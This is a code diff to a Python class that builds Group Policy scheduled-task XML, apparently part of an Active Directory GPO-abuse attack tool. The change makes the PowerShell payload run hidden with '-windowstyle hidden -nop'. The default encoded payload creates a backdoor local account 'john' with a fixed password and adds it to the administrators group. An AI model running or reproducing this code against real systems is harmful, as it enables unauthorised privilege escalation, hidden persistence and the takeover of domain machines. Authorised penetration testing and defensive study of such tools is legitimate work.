@@ -9,8 +9,8 @@ from xml.sax.saxutils import escape
 
 
 class ScheduledTask:
-    def __init__(self, type="computer", name="", mod_date="", description="", powershell=False, command="", old_value=""):
-        self._type = type
+    def __init__(self, gpo_type="computer", name="", mod_date="", description="", powershell=False, command="", old_value=""):
+        self._type = gpo_type
 
         if name:
             self._name = name
@@ -32,9 +32,9 @@ class ScheduledTask:
         if powershell:
             self._shell = escape("powershell.exe")
             if command:
-                self._command = escape('-enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
+                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
             else:
-                self._command = escape('-enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
+                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
         else:
             self._shell = escape('c:\\windows\\system32\\cmd.exe')
             if command:
